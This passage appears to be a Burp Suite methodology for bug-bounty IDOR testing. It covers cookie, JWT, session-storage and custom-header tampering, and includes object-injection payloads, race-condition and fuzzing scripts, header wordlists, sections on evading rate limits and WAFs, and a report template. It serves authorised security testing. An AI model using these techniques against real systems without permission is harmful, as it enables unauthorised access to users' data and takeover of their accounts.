+
+### **Step 4: Configure Match and Replace**
+
+**Project Options > Match and Replace**
+
+Add rules to automatically modify session values:
+
+```
+Add Rule:
+- Type: Request header
+- Match: ^(Cookie:.*)user_id=\d+(.*)$
+- Replace: $1user_id=101$2
+- Comment: "Auto-increment user_id in cookies"
+```
+
+---
+
+## 🧪 **TESTING METHODOLOGY** {#testing}
+
+### **Phase 1: Cookie-Based Session Variables**
+
+#### **Technique 1: Direct Cookie Modification**
+
+1. **Capture a request:**
+```
+GET /api/profile HTTP/1.1
+Host: example.com
+Cookie: session_id=abc123; user_id=100; user_role=user
+```
+
+2. **Send to Repeater**
+3. **Modify user_id in cookie:**
+```
+Cookie: session_id=abc123; user_id=101; user_role=user
+```
+
+4. **Burp Repeater Setup:**
+   - Create 10 tabs with incrementing user_id
+   - Use **Send group in parallel** for efficiency
+
+#### **Technique 2: Cookie Parameter Pollution**
+
+```http
+# Original
+Cookie: session_id=abc123; user_id=100
+
+# Test 1: Duplicate
+Cookie: session_id=abc123; user_id=100; user_id=101
+
+# Test 2: Array format
+Cookie: session_id=abc123; user_id[]=100; user_id[]=101
+
+# Test 3: Different case
+Cookie: session_id=abc123; USER_ID=101
+```
+
+### **Phase 2: JWT Session Variables**
+
+#### **Using Burp's JWT Extension:**
+
+1. **Extract JWT from request:**
+```
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDAsInJvbGUiOiJ1c2VyIn0.signature
+```
+
+2. **Right-click > Send to JWT Editor**
+
+3. **Modify Payload:**
+```json
+{
+  "user_id": 101,
+  "role": "user"
+}
+```
+
+4. **Test Signature Algorithms:**
+   - None algorithm attack
+   - HS256 → RS256 confusion
+   - Key confusion attacks
+
+### **Phase 3: Local/Session Storage**
+
+#### **Methodology with Burp's Browser:**
+
+1. **Open Burp's embedded browser**
+2. **Navigate to application**
+3. **Open Developer Tools** (F12)
+4. **Go to Application tab > Storage**
+
+```javascript
+// Modify in console
+localStorage.setItem('user_id', '101');
+localStorage.setItem('userData', JSON.stringify({id: 101, name: 'victim'}));
+sessionStorage.setItem('currentUser', '101');
+```
+
+5. **Refresh page and intercept request to see changes**
+
+### **Phase 4: Hidden Form Fields**
+
+#### **Using Burp Proxy:**
+
+1. **Intercept form submission:**
+```html
+<form action="/update-profile">
+    <input type="hidden" name="user_id" value="100">
+    <input type="text" name="email">
+</form>
+```
+
+2. **Modify in Burp:**
+```
+POST /update-profile HTTP/1.1
+...
+user_id=101&email=attacker@evil.com
+```
+
+#### **Automated Testing with Intruder:**
+
+```
+Payload positions:
+- user_id=§100§
+- session_user=§100§
+- uid=§100§
+
+Payloads: Numbers 1-200, 1000-1100, 9999-10000
+```
+
+---
+
+## 🚀 **ADVANCED TECHNIQUES** {#advanced}
+
+### **Technique 1: Session Fixation via IDOR**
+
+#### **Steps in Burp:**
+
+1. **Create two user sessions** (User A and User B)
+
+2. **Capture User A's session cookie:**
+```
+Cookie: PHPSESSID=aaaaaa; user_id=100
+```
+
+3. **Attempt to set User B's session with User A's ID:**
+```
+# In User B's session, modify:
+Cookie: PHPSESSID=bbbbbb; user_id=100
+```
+
+4. **Use Burp Repeater with Group Input:**
+   - Tab 1: User A session
+   - Tab 2: User B session with modified user_id
+   - Compare responses
+
+### **Technique 2: Session Data Deserialization**
+
+#### **Identify serialized session data:**
+
+```php
+# Look for patterns in cookies
+s:7:"user_id";i:100;
+O:8:"UserData":2:{s:7:"user_id";i:100;s:8:"username";s:5:"admin";}
+```
+
+#### **Burp Intruder for Object Injection:**
+```
+Position: cookie_value=§serialized_data§
+
+Payloads:
+- O:8:"UserData":2:{s:7:"user_id";i:101;s:8:"username";s:5:"admin";}
+- O:8:"UserData":2:{s:7:"user_id";i:100;s:8:"username";s:7:"attacker";}
+- O:8:"UserData":2:{s:7:"user_id";i:999;s:8:"username";s:4:"root";}
+```
+
+### **Technique 3: Session Race Conditions**
+
+#### **Using Burp Turbo Intruder:**
+
+```python
+# Turbo Intruder script for race conditions
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=20,
+                           requestsPerConnection=100,
+                           pipeline=False)
+
+    # First request - normal session
+    engine.queue(target.req)
+    
+    # Race condition - modify session mid-request
+    for i in range(50):
+        engine.queue(target.req, gate='race1')
+    
+    engine.openGate('race1')
+    engine.start()
+
+def handleResponse(req, interesting):
+    if 'user 101' in req.response:
+        table.add(req)
+```
+
+### **Technique 4: Session Token Brute-Force**
+
+#### **Burp Intruder Setup:**
+```
+Attack type: Pitchfork
+
+Position 1: session_token=§token§
+Position 2: user_id=§user§
+
+Payload set 1: Generated tokens (wordlist)
+Payload set 2: Numbers 100-200
+
+Resource pool: Maximum concurrent requests
+```
+
+### **Technique 5: Custom Headers Session Bypass**
+
+#### **Test common session headers:**
+```
+X-Original-User-ID: 101
+X-Forwarded-User: 101
+X-User-ID: 101
+X-Proxy-User-ID: 101
+X-Authenticated-User: 101
+X-Impersonate: 101
+X-Original-User: 101
+```
+
+#### **Burp Intruder - Cluster Bomb:**
+```
+Headers to test:
+§X-User-ID§: §101§
+§X-Original-User§: §102§
+§X-Forwarded-For§: §103§
+```
+
+---
+
+## 💥 **EXPLOITATION SCENARIOS** {#exploitation}
+
+### **Scenario 1: Session-Based Account Takeover**
+
+#### **Step-by-Step Exploitation:**
+
+1. **Recon:**
+```http
+GET /api/user/settings HTTP/1.1
+Cookie: session=eyJ1c2VySWQiOjEwMCwidXNlcm5hbWUiOiJ1c2VyMTAwIn0
+```
+
+2. **Decode session token:**
+```bash
+echo "eyJ1c2VySWQiOjEwMCwidXNlcm5hbWUiOiJ1c2VyMTAwIn0" | base64 -d
+{"userId":100,"username":"user100"}
+```
+
+3. **Modify and re-encode:**
+```bash
+echo '{"userId":101,"username":"victim101"}' | base64
+eyJ1c2VySWQiOjEwMSwidXNlcm5hbWUiOiJ2aWN0aW0xMDEifQ==
+```
+
+4. **Replace in Burp Repeater:**
+```http
+GET /api/user/settings HTTP/1.1
+Cookie: session=eyJ1c2VySWQiOjEwMSwidXNlcm5hbWUiOiJ2aWN0aW0xMDEifQ==
+```
+
+### **Scenario 2: Session Variable in WebSocket**
+
+#### **Using Burp WebSocket Editor:**
+
+1. **Identify WebSocket connection:**
+```javascript
+var ws = new WebSocket("wss://example.com/chat");
+ws.send(JSON.stringify({
+    type: "auth",
+    session: "user100_token",
+    user_id: 100
+}));
+```
+
+2. **Intercept WebSocket in Burp:**
+   - Proxy > WebSockets history
+   - Right-click > Send to Repeater
+
+3. **Modify session data:**
+```json
+{
+    "type": "auth",
+    "session": "user100_token",
+    "user_id": 101
+}
+```
+
+### **Scenario 3: Session ID in GraphQL**
+
+#### **Burp GraphQL Testing:**
+
+1. **Intercept GraphQL request:**
+```graphql
+query {
+  userProfile(sessionId: "abc123", userId: 100) {
+    email
+    creditCard
+  }
+}
+```
+
+2. **Modify variables:**
+```graphql
+query {
+  userProfile(sessionId: "abc123", userId: 101) {
+    email
+    creditCard
+  }
+}
+```
+
+3. **Use GraphQL Playground in Burp to test variations**
+
+---
+
+## 📊 **AUTOMATION WITH BURP** {#automation}
+
+### **Custom Python Script for Burp Extender**
+
+```python
+from burp import IBurpExtender, IScannerCheck, IScanIssue
+from java.util import ArrayList
+import re
+
+class BurpExtender(IBurpExtender, IScannerCheck):
+    
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks = callbacks
+        self._helpers = callbacks.getHelpers()
+        callbacks.setExtensionName("Session IDOR Scanner")
+        callbacks.registerScannerCheck(self)
+        print("Session IDOR Scanner loaded")
+        
+    def doPassiveScan(self, baseRequestResponse):
+        issues = ArrayList()
+        
+        # Analyze response for session variables
+        response = baseRequestResponse.getResponse()
+        response_str = self._helpers.bytesToString(response)
+        
+        # Look for session patterns
+        patterns = [
+            r'user[_-]id["\s:]+(\d+)',
+            r'session[_-]id["\s:]+["\']([^"\']+)',
+            r'data-user-id=["\'](\d+)',
+            r'localStorage\.setItem\(["\']user_id["\'],\s*["\'](\d+)'
+        ]
+        
+        for pattern in patterns:
+            matches = re.findall(pattern, response_str, re.IGNORECASE)
+            if matches:
+                print("Found potential session variable: " + str(matches))
+                
+        return issues
+    
+    def doActiveScan(self, baseRequestResponse, insertionPoint):
+        # Active scanning logic
+        test_payloads = ['101', '102', '999', '0', '-1']
+        
+        for payload in test_payloads:
+            checkRequest = insertionPoint.buildRequest(payload)
+            checkResponse = self._callbacks.makeHttpRequest(
+                baseRequestResponse.getHttpService(), checkRequest)
+            
+            # Analyze response
+            if self._isSuccessful(checkResponse):
+                return [self._createIssue(baseRequestResponse)]
+        
+        return None
+    
+    def _isSuccessful(self, checkResponse):
+        response = checkResponse.getResponse()
+        body = self._helpers.bytesToString(response)
+        # Add logic to detect successful exploitation
+        return False
+    
+    def _createIssue(self, baseRequestResponse):
+        # Create scan issue
+        return None
+```
+
+### **Burp Intruder Payload Generator**
+
+```python
+# Custom payload generator for session variables
+from random import randint
+import base64
+import json
+
+def generate_session_payloads():
+    payloads = []
+    
+    # Numeric variations
+    for i in range(1, 101):
+        payloads.append(str(i))
+    
+    # Base64 encoded IDs
+    for i in [100, 101, 102, 999]:
+        encoded = base64.b64encode(str(i).encode()).decode()
+        payloads.append(encoded)
+    
+    # JSON encoded
+    for i in [100, 101, 999]:
+        json_data = json.dumps({"user_id": i})
+        payloads.append(json_data)
+        payloads.append(base64.b64encode(json_data.encode()).decode())
+    
+    # Serialized PHP
+    for i in [100, 101]:
+        payloads.append('s:7:"user_id";i:{};'.format(i))
+    
+    return payloads
+```
+
+---
+
+## 📝 **REPORTING TEMPLATE** {#reporting}
+
+### **Finding: Session-Based IDOR Vulnerability**
+
+```markdown
+# Vulnerability Report: Session Variable IDOR
+
+## Title
+Session Variable Manipulation Leading to Unauthorized Data Access
+
+## Severity
+**High** - CVSS 3.1 Score: 8.2 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)
+
+## Affected Endpoint
+`https://example.com/api/user/profile`
+
+## Description
+The application stores the current user's ID in a session cookie (`user_id`) and uses this value directly to fetch user data without verifying that the session token belongs to that user. This allows an attacker to modify the `user_id` cookie value to access other users' profiles.
+
+## Steps to Reproduce
+
+### Prerequisites
+- Two user accounts: attacker@test.com (ID: 100) and victim@test.com (ID: 101)
+- Burp Suite Community/Professional
+
+### Reproduction Steps
+
+1. **Login as attacker** (ID: 100) and intercept request:
+```
+GET /api/user/profile HTTP/1.1
+Host: example.com
+Cookie: session_id=abc123; user_id=100
+```
+
+2. **Send to Burp Repeater** (Ctrl+R)
+
+3. **Modify the user_id cookie value**:
+```
+GET /api/user/profile HTTP/1.1
+Host: example.com
+Cookie: session_id=abc123; user_id=101
+```
+
+4. **Forward the request** and observe response:
+```json
+{
+  "success": true,
+  "data": {
+    "id": 101,
+    "email": "victim@test.com",
+    "credit_card": "4111-1111-1111-1111",
+    "address": "123 Victim St"
+  }
+}
+```
+
+### Proof of Concept (Screenshots)
+[Attach screenshots showing]:
+1. Original request with user_id=100
+2. Modified request with user_id=101  
+3. Response containing victim's data
+
+### Impact
+- **Confidentiality**: Unauthorized access to any user's personal data
+- **Account Takeover**: Potential to reset passwords or modify profiles
+- **Data Breach**: Mass extraction of user information possible through enumeration
+
+### Remediation
+1. **Server-side Authorization**: Always verify that the authenticated user (from session token) owns the requested resource
+2. **Indirect References**: Use random, non-sequential identifiers
+3. **Session Binding**: Bind user_id to session token server-side
+4. **Input Validation**: Treat all user input as untrusted
+
+### Affected Code
+```php
+// Vulnerable code
+$user_id = $_COOKIE['user_id'];
+$query = "SELECT * FROM users WHERE id = $user_id";
+
+// Fixed code
+$session_user_id = $_SESSION['authenticated_user_id'];
+if ($session_user_id == $_COOKIE['user_id']) {
+    $query = "SELECT * FROM users WHERE id = $session_user_id";
+}
+```
+
+### Timeline
+- **Discovery**: [Date]
+- **Reported**: [Date]  
+- **Acknowledged**: [Date]
+- **Fixed**: [Date]
+- **Bounty Paid**: [Amount]
+
+### Additional Notes
+This vulnerability affects all endpoints that reference the `user_id` cookie parameter. Similar issues were found in:
+- `/api/user/settings`
+- `/api/orders/list`
+- `/api/messages/inbox`
+
+### References
+- OWASP: IDOR Prevention Cheat Sheet
+- CWE-639: Authorization Bypass Through User-Controlled Key
+- PortSwigger: Session-based IDOR vulnerabilities
+```
+
+---
+
+## 🛡️ **DEFENSE EVASION TIPS**
+
+### **Bypassing Rate Limits**
+
+```python
+# Turbo Intruder with delays
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=1,
+                           pipeline=False)
+    
+    for i in range(100, 200):
+        engine.queue(target.req, str(i))
+        time.sleep(1)  # 1 second delay between requests
+```
+
+### **IP Rotation via Burp Suite**
+1. Use **Burp Collaborator** for blind detection
+2. Configure **Project Options > Connections > SOCKS Proxy**
+3. Rotate through proxy list
+
+### **Request Randomization**
+```http
+# Add random parameters to avoid pattern detection
+GET /api/profile?user_id=101&_=123456789
+GET /api/profile?user_id=101&_=987654321
+GET /api/profile?user_id=101&cache_bust=random123
+```
+
+---
+
+## 🔧 **TROUBLESHOOTING COMMON ISSUES**
+
+### **Issue 1: Session Variables Not Persisting**
+**Solution:**
+```python
+# Ensure macro captures session correctly
+Macro steps:
+1. GET /login → Extract CSRF token
+2. POST /login with credentials → Extract session cookie
+3. GET /dashboard → Extract user_id
+```
+
+### **Issue 2: Application Using HTTPOnly Cookies**
+**Solution:**
+- Use Burp's **Session Handling Rules** to auto-modify
+- Create custom **Session Handling Action**
+
+### **Issue 3: Encrypted Session Data**
+**Solution:**
+1. Identify encryption pattern
+2. Test with known plaintext attacks
+3. Look for ECB mode vulnerabilities
+
+---
+
+## 📚 **RESOURCES & REFERENCES**
+
+### **Burp Suite Extensions**
+- **Session Token Analyzer**
+- **JWT Editor**
+- **Autorize**
+- **Authz**
+- **Turbo Intruder**
+- **403 Bypasser**
+
+### **Useful Commands**
+```bash
+# Decode common session formats
+echo "dXNlcl9pZDoxMDE=" | base64 -d
+echo -n '{"user_id":101}' | base64
+
+# Extract cookies from Burp logs
+cat burp_requests.log | grep -oP 'Cookie: \K[^\n]+'
+
+# Generate session wordlist
+seq 1 1000 > session_ids.txt
+```
+
+### **Practice Labs**
+- PortSwigger: Session-based IDOR labs
+- PentesterLab: Session Fixation exercises
+- HackTheBox: JSON Web Token attacks
+
+---
+
+## ✅ **CHECKLIST**
+
+### Pre-Testing
+- [ ] Configure Burp proxy
+- [ ] Install required extensions
+- [ ] Create test accounts (minimum 2)
+- [ ] Map all session storage locations
+- [ ] Document session patterns
+
+### Testing
+- [ ] Test cookie modification
+- [ ] Test JWT manipulation
+- [ ] Test local/session storage
+- [ ] Test hidden form fields
+- [ ] Test WebSocket connections
+- [ ] Test GraphQL variables
+- [ ] Test race conditions
+
+### Post-Testing
+- [ ] Document all findings
+- [ ] Create proof of concept
+- [ ] Assess business impact
+- [ ] Prepare remediation steps
+- [ ] Submit report
+
+---
+
+# 🔍 **Complete Burp Suite Methodology for IDOR Technique #23: HTTP Headers**
+
+## **Technique #23: HTTP Headers IDOR** - Testing IDOR vulnerabilities through custom HTTP headers
+
+---
+
+## 📋 **Understanding the Technique**
+
+**What are HTTP Header IDORs?**
+- Applications sometimes use custom headers for authorization or object references
+- Headers like `X-User-ID`, `X-Forwarded-For`, `X-Original-User`, `X-Override-ID`, etc.
+- Server may trust these headers without proper validation
+
+**Common Vulnerable Headers:**
+```
+X-User-ID: 100
+X-Impersonate: 100
+X-Act-As: 100
+X-Original-User: 100
+X-Override-ID: 100
+X-Forwarded-For: 192.168.1.100
+X-Real-IP: 192.168.1.100
+X-Proxy-User-ID: 100
+X-Auth-User-ID: 100
+X-User-Id-Override: 100
+X-Role-ID: admin
+```
+
+---
+
+## 🎯 **Phase 1: Reconnaissance & Header Discovery**
+
+### **Step 1.1: Passive Header Discovery**
+
+**Using Burp Proxy - Capture all requests:**
+1. Configure browser to use Burp (127.0.0.1:8080)
+2. Navigate through the application normally
+3. Go to **Proxy → HTTP History**
+4. Filter by extension (JS, CSS, Images excluded)
+5. Look for interesting headers in:
+   - Request headers
+   - Response headers
+   - Custom header patterns
+
+**Burp Filter Setup:**
+```
+Filter by MIME type: HTML, JSON, XML, Text
+Show only: Parameterful requests
+Hide: CSS, Images, Fonts
+```
+
+### **Step 1.2: Header Enumeration with Burp Intruder**
+
+**Create Header Wordlist:**
+Save this as `headers.txt`:
+```
+X-User-ID
+X-User-Id
+X-UID
+X-Uid
+X-UserID
+X-UserId
+X-Auth-ID
+X-Auth-Id
+X-AuthUser
+X-Auth-User
+X-Original-User
+X-OriginalUser
+X-Impersonate
+X-Impersonation
+X-Act-As
+X-ActAs
+X-On-Behalf-Of
+X-Override-ID
+X-Override
+X-Proxy-User
+X-Proxy-ID
+X-Real-User
+X-Real-ID
+X-Forwarded-User
+X-Forwarded-ID
+X-Remote-User
+X-Remote-ID
+X-API-User
+X-API-ID
+X-Access-User
+X-Access-ID
+X-App-User
+X-App-ID
+X-Client-ID
+X-Client-User
+X-Consumer-ID
+X-Consumer-Username
+X-Credentials-ID
+X-Identity
+X-JWT-Subject
+X-Impersonate-User
+X-Masquerade
+X-User-Email
+X-Account-ID
+X-Customer-ID
+X-Member-ID
+X-Profile-ID
+X-Employee-ID
+X-Admin-ID
+X-Role-ID
+X-Permission-User
+X-Delegated-User
+X-Switch-User
+X-Original-Email
+X-Auth-Email
+X-User-Override
+X-ID-Override
+```
+
+**Intruder Attack Setup:**
+1. Select a baseline request
+2. Right-click → **Send to Intruder**
+3. Positions tab → Clear §
+4. Add payload position in headers section:
+```
+GET /api/user/profile HTTP/1.1
+Host: target.com
+§X-Test-Header§: 100
+Cookie: session=abc123
+```
+
+5. **Payloads tab:**
+   - Payload type: Simple list
+   - Load `headers.txt`
+   - Add suffix: `: 100` (or load with values pre-added)
+
+6. **Settings tab:**
+   - **Grep - Match**: Add strings to identify potential successes:
+     - "profile"
+     - "user data"
+     - "email"
+     - "admin"
+     - "200 OK"
+     - content-length differences
+
+### **Step 1.3: Spidering for Header Patterns**
+
+**Using Burp Spider/Scanner:**
+1. Target tab → Right-click domain → **Spider this host**
+2. Enable: "Spider form inputs"
+3. After spidering, check:
+   - **Target → Site map**
+   - Look for requests with custom headers
+   - Note patterns in header usage
+
+---
+
+## 🔍 **Phase 2: Identifying Valid User IDs**
+
+### **Step 2.1: ID Gathering from Responses**
+
+**Using Burp Extractor:**
+1. Navigate through application authenticated as User A
+2. Look for ID leaks in:
+   - JSON responses
+   - HTML comments
+   - JavaScript variables
+   - Hidden form fields
+   - Meta tags
+
+**Burp Match and Replace for Auto-Capture:**
+1. Go to **Proxy → Options → Match and Replace**
+2. Add rule:
+   - Match: `"user_id":(\d+)`
+   - Replace: `"user_id":$1 [FOUND]`
+   - This highlights IDs in responses
+
+### **Step 2.2: Create ID Wordlist**
+
+From your observations, create `ids.txt`:
+```
+101
+102
+103
+1001
+1002
+admin
+administrator
+test
+```
+
+**Using Burp Intruder for ID Enumeration:**
+1. Find an endpoint that returns user data (e.g., `/api/user/profile`)
+2. Send to Intruder
+3. Set position in header value: `X-User-ID: §100§`
+4. Payload: Numbers from 1-1000
+5. **Grep Extract**: Configure to extract:
+   - Response length
+   - Status codes
+   - Keywords like "email", "name", "role"
+
+---
+
+## 🧪 **Phase 3: Testing Methodology**
+
+### **Step 3.1: Baseline Testing**
+
+**Create Two User Accounts:**
+- User A (attacker) - ID: 100
+- User B (victim) - ID: 101
+
+**Baseline Request (as User A):**
+```http
+GET /api/user/profile HTTP/1.1
+Host: target.com
+Cookie: session=USER_A_SESSION
+```
+
+**Modified Request with Header:**
+```http
+GET /api/user/profile HTTP/1.1
+Host: target.com
+X-User-ID: 101
+Cookie: session=USER_A_SESSION
+```
+
+### **Step 3.2: Burp Repeater Manual Testing**
+
+**Workflow in Repeater:**
+1. Capture authenticated request
+2. Right-click → **Send to Repeater**
+3. Add one header at a time
+4. Try combinations:
+
+**Test Sequence:**
+```http
+# Test 1: Add single header
+X-User-ID: 101
+
+# Test 2: Try different header names
+X-Auth-User: 101
+
+# Test 3: Try with original header removed
+[Remove original auth headers]
+X-Override-ID: 101
+
+# Test 4: Try with multiple headers
+X-Original-User: 101
+X-Real-User: 101
+
+# Test 5: Try with different ID formats
+X-User-ID: 101
+X-User-ID: "101"
+X-User-ID: 0x65
+X-User-ID: 0145
+```
+
+### **Step 3.3: Burp Intruder Automated Testing**
+
+**Attack Type: Pitchfork (multiple payload positions)**
+
+**Request Template:**
+```http
+GET /api/user/profile HTTP/1.1
+Host: target.com
+§X-User-ID§: §101§
+§X-Original-User§: §101§
+Cookie: session=USER_A_SESSION
+```
+
+**Payload Sets:**
+- Set 1: Header names (from headers.txt)
+- Set 2: User IDs (from ids.txt)
+
+**Settings:**
+- Resource pool: 1 thread (to avoid rate limiting)
+- Retries: 2
+- Throttle between requests: 200ms
+
+---
+
+## 🎨 **Phase 4: Advanced Testing Techniques**
+
+### **Step 4.1: Header Priority Testing**
+
+Test header precedence when multiple exist:
+
+**Burp Intruder - Cluster Bomb:**
+```http
+GET /api/user/profile HTTP/1.1
+Host: target.com
+X-User-ID: §100§
+X-Original-User: §101§
+X-Override-ID: §102§
+Cookie: session=USER_A_SESSION
+```
+
+Analyze which header takes precedence.
+
+### **Step 4.2: Header Injection Variations**
+
+**Case Manipulation:**
+```
+x-user-id: 101
+X-User-Id: 101
+X-USER-ID: 101
+```
+
+**Whitespace Variations:**
+```
+X-User-ID:101
+X-User-ID: 101
+X-User-ID:    101
+X-User-ID: 101 [space at end]
+```
+
+**Encoding:**
+```
+X-User-ID: %31%30%31
+X-User-ID: 101%00
+X-User-ID: 101%0d%0a
+```
+
+### **Step 4.3: Chained Header Attacks**
+
+**Test with other IDOR locations:**
+
+```http
+GET /api/user/§100§/profile HTTP/1.1
+Host: target.com
+X-User-ID: §101§
+Cookie: session=USER_A_SESSION
+```
+
+This tests if header overrides URL parameter.
+
+---
+
+## 🤖 **Phase 5: Using Burp Extensions**
+
+### **Step 5.1: Install Essential Extensions**
+
+**Via BApp Store:**
+1. **Autorize** - Automates authorization tests
+2. **Authz** - Test with different credentials
+3. **Headhunter** - Security header analyzer
+4. **Paramalyzer** - Track parameters across requests
+5. **Turbo Intruder** - High-speed brute forcing
+
+### **Step 5.2: Autorize Configuration**
+
+1. Install Autorize extension
+2. Configure with two sessions:
+   - Low privilege user (attacker)
+   - High privilege user (victim)
+3. **Auto-test headers:**
+   - Enable "Add headers to requests"
+   - Add your test headers
+4. Run and check for:
+   - Bypassed endpoints
+   - Forced browsing successes
+
+### **Step 5.3: Custom Extension - Header Fuzzer**
+
+Create a simple Python extension for Burp:
+
+```python
+from burp import IBurpExtender, IIntruderPayloadGeneratorFactory, IIntruderPayloadGenerator
+from java.util import List, ArrayList
+import random
+
+class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
+    
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks = callbacks
+        self._helpers = callbacks.getHelpers()
+        callbacks.setExtensionName("Header IDOR Fuzzer")
+        callbacks.registerIntruderPayloadGeneratorFactory(self)
+        print("Header IDOR Fuzzer loaded")
+    
+    def getGeneratorName(self):
+        return "Header IDOR Payloads"
+    
+    def createNewInstance(self, attack):
+        return HeaderIDORGenerator()
+    
+class HeaderIDORGenerator(IIntruderPayloadGenerator):
+    def __init__(self):
+        self.headers = [
+            "X-User-ID", "X-Auth-ID", "X-Original-User", 
+            "X-Impersonate", "X-Act-As", "X-Override-ID"
+        ]
+        self.ids = [101, 102, 103, 1001, 1002]
+        self.index = 0
+        self.max = len(self.headers) * len(self.ids)
+    
+    def hasMorePayloads(self):
+        return self.index < self.max
+    
+    def getNextPayload(self, baseValue):
+        header_index = self.index / len(self.ids)
+        id_index = self.index % len(self.ids)
+        payload = "%s: %s" % (self.headers[header_index], self.ids[id_index])
+        self.index += 1
+        return payload
+    
+    def reset(self):
+        self.index = 0
+```
+
+---
+
+## 📊 **Phase 6: Analysis & Validation**
+
+### **Step 6.1: Response Analysis in Burp**
+
+**Filtering Results:**
+1. Go to Intruder → Results
+2. Sort by:
+   - Status code (200 vs 403)
+   - Response length (anomalies)
+   - Response time (potential timing attacks)
+
+**Grep Extract Configuration:**
+Add these patterns to extract:
+```regex
+"email":"([^"]+)"
+"role":"([^"]+)"
+"id":(\d+)
+"name":"([^"]+)"
+```
+
+### **Step 6.2: Manual Validation**
+
+For each promising result:
+1. Right-click → **Send to Repeater**
+2. Compare with:
+   - Legitimate request as User A
+   - Legitimate request as User B
+3. Check for:
+   - Data exposure
+   - Functionality access
+   - State changes
+
+### **Step 6.3: Impact Assessment**
+
+**Check for:**
+- PII exposure (email, phone, address)
+- Financial data
+- Administrative functions
+- Ability to modify data
+- Account takeover potential
+
+---
+
+## 🛡️ **Phase 7: Bypassing Protections**
+
+### **Step 7.1: Rate Limiting Bypass**
+
+**Using Burp Intruder with Throttling:**
+```
+Settings → Resource pool → 
+- Maximum concurrent requests: 1
+- Delay between requests: 1000-5000ms
+```
+
+**IP Rotation via Headers:**
+```http
+X-Forwarded-For: 192.168.1.§100§
+X-Real-IP: 10.0.0.§100§
+X-Original-IP: 172.16.0.§100§
+```
+
+### **Step 7.2: WAF Bypass Techniques**
+
+**Header Obfuscation:**
+```
+X-User-@ID: 101
+X-User-Id: 101
+X-User-!D: 101
+X-User_-ID: 101
+```
+
+**Case Randomization:**
+```python
+import random
+header = "X-User-ID"
+obfuscated = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in header)
+```
+
+### **Step 7.3: Session/Header Combinations**
+
+**Test if header works without session:**
+```http
+GET /api/user/profile HTTP/1.1
+Host: target.com
+X-User-ID: 101
+[No Cookie header]
+```
+
+**Test if header overrides session:**
+```http
+GET /api/user/profile HTTP/1.1
+Host: target.com
+X-User-ID: 101
+Cookie: session=USER_A_SESSION
+```
+
+---
+
+## 📝 **Phase 8: Reporting**
+
+### **Step 8.1: Capture Evidence in Burp**
+
+1. **Request/Response pairs:**
+   - Right-click → **Save item**
+   - Include both successful and baseline requests
+
+2. **Screenshots:**
+   - Burp Repeater showing request/response
+   - Comparison of User A vs User B data
+
+3. **Generate Report:**
+   - Select findings
+   - Right-click → **Report selected issues**
+   - HTML format with evidence
+
+### **Step 8.2: Documentation Template**
+
+```
+## Vulnerability: HTTP Header IDOR
+
+### Endpoint
+https://target.com/api/user/profile
+
+### Headers Tested
+X-User-ID: 101
+
+### Original Request (User A - ID: 100)
+[PASTE REQUEST]
+[PASTE RESPONSE - User A's data]
+
+### Exploit Request
+[PASTE REQUEST with modified header]
+[PASTE RESPONSE - User B's data]
+
+### Impact
+- Access to User B's personal information
+- [Specific data exposed]
+
+### Remediation
+- Validate user permissions server-side
+- Do not trust client-supplied headers
+- Implement proper session validation
+```
+
+---
+
+## 🎯 **Quick Reference Checklist**
+
+```
+[ ] Configure Burp Proxy
+[ ] Create two test accounts
+[ ] Gather baseline requests
+[ ] Create header wordlist
+[ ] Create ID wordlist
+[ ] Run Intruder attacks
+[ ] Install relevant extensions
+[ ] Manual Repeater testing
+[ ] Analyze responses
+[ ] Validate findings
+[ ] Document with evidence
+[ ] Check for chaining possibilities
+[ ] Test bypass techniques
+[ ] Prepare final report
+```
+
+---
+
+## 🚨 **Pro Tips**
+
+1. **Session Management:** Keep two browser sessions logged in as different users for quick comparison
+
+2. **Macros in Burp:** Create macros to automatically refresh tokens/sessions during long intruder attacks
+
+3. **Scope Configuration:** Always set target scope to avoid attacking unintended hosts
+
+4. **Resource Pools:** Use different resource pools for different attack types to manage concurrency
+
+5. **Match/Replace Rules:** Create rules to automatically add test headers to all requests
+
+6. **Session Handling Rules:** Configure rules to handle CSRF tokens and session renewal
+
+7. **Extensions Worth Installing:**
+   - **JSON Web Tokens** - For JWT manipulation
+   - **Logger++** - Advanced logging
+   - **Copy as Python-Requests** - For proof-of-concept scripts
+
+---
+
+## ⚠️ **Important Considerations**
+
+- Always work within authorized scope
+- Be careful not to modify data during testing
+- Document rate limits and respect them
+- Test in non-production environments first
+- Verify findings multiple times
+- Consider privacy implications when accessing user data
+
+---
+
+# 🔍 **Bug #24: HTTP Headers IDOR - Complete Burp Suite Methodology**
+
+## 📋 **Bug Description**
+**IDOR vulnerability in HTTP Headers** - When object references are passed through custom HTTP headers instead of traditional parameters (URL, POST body, etc.)
+
+---
+
+## 🎯 **Common Vulnerable Headers**
+
+### **Authentication/Authorization Headers**
+```
+X-User-ID: 100
+X-User-Id: 100
+X-User: 100
+X-UID: 100
+X-Account-ID: 100
+X-Customer-ID: 100
+X-Profile-ID: 100
+X-Impersonate: 100
+X-On-Behalf-Of: 100
+X-Act-As: 100
+X-Original-User: 100
+```
+
+### **Debug/Testing Headers**
+```
+X-Debug-User: 100
+X-Test-User: 100
+X-Admin-User: 100
+X-Bypass-User: 100
+X-Forwarded-User: 100
+X-Original-User: 100
+X-Impersonating: 100
+X-Run-As: 100
+```
+
+### **Proxy/Forward Headers**
+```
+X-Forwarded-For: 127.0.0.1 (with user context)
+X-Real-IP: 127.0.0.1 (with user context)
+X-Original-For: 127.0.0.1
+Forwarded: for=192.0.2.60;proto=http;by=203.0.113.43
+```
+
+### **Application-Specific Headers**
+```
+X-App-User: 100
+X-Organization: 100
+X-Team-ID: 100
+X-Role-ID: 100
+X-Group-ID: 100
+X-Department-ID: 100
+X-Company-ID: 100
+X-Workspace-ID: 100
+X-Project-ID: 100
+```
+
+---
+
+## 🛠️ **Phase 1: Reconnaissance & Discovery**
+
+### **Step 1.1: Spider/Crawl the Application**
+1. Configure Burp Spider:
+   ```
